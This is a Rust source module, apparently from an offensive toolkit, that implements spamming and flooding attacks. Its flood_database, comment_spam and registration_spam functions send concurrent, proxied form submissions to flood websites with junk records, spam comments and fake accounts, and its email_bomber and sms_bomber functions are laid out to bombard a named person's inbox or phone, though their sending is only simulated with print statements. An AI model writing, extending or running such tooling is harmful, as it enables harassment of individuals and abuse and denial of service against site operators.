//! Spamming and flooding module
//! Database injection, email bombing, SMS bombing, comment spam.

use reqwest::Client;
use rand::Rng;
use rand::seq::SliceRandom;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::{Duration, sleep};
use crate::utils::{throttle, SharedRateLimiter, random_string, build_http_client};

/// Flood a database endpoint with random INSERT requests
pub async fn flood_database(
    endpoint: &str,
    fields: &[(&str, &str)],
    count: usize,
    threads: usize,
    proxy: Option<&str>,
    rate_limiter: SharedRateLimiter,
) -> usize {
    let client = build_http_client(proxy, 10, "SpamBot/1.0");
    let semaphore = Arc::new(Semaphore::new(threads));
    let mut tasks = vec![];
    let mut successful = 0;

    for _ in 0..count {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let url = endpoint.to_string();
        let lim = rate_limiter.clone();
        let mut form_data = Vec::new();
        for (k, v) in fields {
            let val = if *v == "__RANDOM__" {
                random_string(8)
            } else if *v == "__RANDOM_EMAIL__" {
                format!("spam_{}@example.com", random_string(6))
            } else if *v == "__RANDOM_NUMBER__" {
                rand::thread_rng().gen_range(0..999999).to_string()
            } else {
                v.to_string()
            };
            form_data.push((k.to_string(), val));
        }

        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            throttle(&lim).await;
            let resp: Result<reqwest::Response, reqwest::Error> = c.post(&url).form(&form_data).send().await;
            resp.is_ok() && resp.unwrap().status().is_success()
        }));
    }

    for task in tasks {
        if task.await.unwrap_or(false) {
            successful += 1;
        }
    }
    successful
}

/// Email bomber (simulated using a public API or SMTP)
pub async fn email_bomber(
    target_email: &str,
    subject: &str,
    body_template: &str,
    count: usize,
    threads: usize,
    proxy: Option<&str>,
    rate_limiter: SharedRateLimiter,
) -> usize {
    let _client = build_http_client(proxy, 10, "EmailBomber/1.0");
    let semaphore = Arc::new(Semaphore::new(threads));
    let mut tasks = vec![];
    let mut sent = 0;

    for i in 0..count {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let lim = rate_limiter.clone();
        let email = target_email.to_string();
        let subj = subject.replace("__NUM__", &i.to_string());
        let _body = body_template.replace("__NUM__", &i.to_string());

        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            throttle(&lim).await;
            // This is a simulation – real implementation would use SMTP or a public API
            // For demonstration, we just log and return true
            println!("[SIM] Sending email {} to {}: {}", i, email, subj);
            sleep(Duration::from_millis(50)).await;
            true
        }));
    }

    for task in tasks {
        if task.await.unwrap_or(false) {
            sent += 1;
        }
    }
    sent
}

/// SMS bomber (simulated using a public API)
pub async fn sms_bomber(
    target_phone: &str,
    message_template: &str,
    count: usize,
    threads: usize,
    api_key: Option<&str>,
    rate_limiter: SharedRateLimiter,
) -> usize {
    let _client = Client::new();
    let semaphore = Arc::new(Semaphore::new(threads));
    let mut tasks = vec![];
    let mut sent = 0;

    for i in 0..count {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let lim = rate_limiter.clone();
        let phone = target_phone.to_string();
        let msg = message_template.replace("__NUM__", &i.to_string());
        let _key = api_key.map(|s| s.to_string());

        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            throttle(&lim).await;
            // Simulation – real SMS APIs require integration
            println!("[SIM] Sending SMS {} to {}: {}", i, phone, msg);
            sleep(Duration::from_millis(100)).await;
            true
        }));
    }

    for task in tasks {
        if task.await.unwrap_or(false) {
            sent += 1;
        }
    }
    sent
}

/// Comment spam on blog posts or forums
pub async fn comment_spam(
    target_url: &str,
    comment_field: &str,
    name_field: &str,
    email_field: &str,
    comment_template: &str,
    count: usize,
    threads: usize,
    proxy: Option<&str>,
    rate_limiter: SharedRateLimiter,
) -> usize {
    let client = build_http_client(proxy, 10, "CommentSpammer/1.0");
    let semaphore = Arc::new(Semaphore::new(threads));
    let mut tasks = vec![];
    let mut posted = 0;
    let names = vec!["SpamBot", "Visitor", "Guest", "Anonymous", "User"];
    let emails = vec!["spam@example.com", "bot@example.org", "noreply@test.com"];

    for i in 0..count {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let url = target_url.to_string();
        let lim = rate_limiter.clone();
        let comment = comment_template.replace("__NUM__", &i.to_string());
        let name = *names.choose(&mut rand::thread_rng()).unwrap();
        let email = *emails.choose(&mut rand::thread_rng()).unwrap();
        let cf = comment_field.to_string();
        let nf = name_field.to_string();
        let ef = email_field.to_string();

        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            throttle(&lim).await;
            let params = [
                (cf.as_str(), comment.as_str()),
                (nf.as_str(), name),
                (ef.as_str(), email),
            ];
            let resp: Result<reqwest::Response, reqwest::Error> = c.post(&url).form(&params).send().await;
            resp.is_ok() && resp.unwrap().status().is_success()
        }));
    }

    for task in tasks {
        if task.await.unwrap_or(false) {
            posted += 1;
        }
    }
    posted
}

/// Generate random user data for registration spam
pub fn generate_random_user() -> (String, String, String) {
    let username = format!("user_{}", random_string(6));
    let email = format!("{}@spam.com", random_string(8));
    let password = random_string(10);
    (username, email, password)
}

/// Registration spam on vulnerable signup pages
pub async fn registration_spam(
    signup_url: &str,
    fields: &[(&str, &str)],
    count: usize,
    threads: usize,
    proxy: Option<&str>,
    rate_limiter: SharedRateLimiter,
) -> usize {
    let client = build_http_client(proxy, 10, "RegSpam/1.0");
    let semaphore = Arc::new(Semaphore::new(threads));
    let mut tasks = vec![];
    let mut successful = 0;

    for _ in 0..count {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let url = signup_url.to_string();
        let lim = rate_limiter.clone();
        let mut form_data = Vec::new();
        let (user, email, pass) = generate_random_user();

        for (k, v) in fields {
            let val = match *v {
                "__USERNAME__" => user.clone(),
                "__EMAIL__" => email.clone(),
                "__PASSWORD__" => pass.clone(),
                "__RANDOM__" => random_string(8),
                _ => v.to_string(),
            };
            form_data.push((k.to_string(), val));
        }

        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            throttle(&lim).await;
            let resp: Result<reqwest::Response, reqwest::Error> = c.post(&url).form(&form_data).send().await;
            resp.is_ok() && resp.unwrap().status().is_success()
        }));
    }

    for task in tasks {
        if task.await.unwrap_or(false) {
            successful += 1;
        }
    }
    successful
}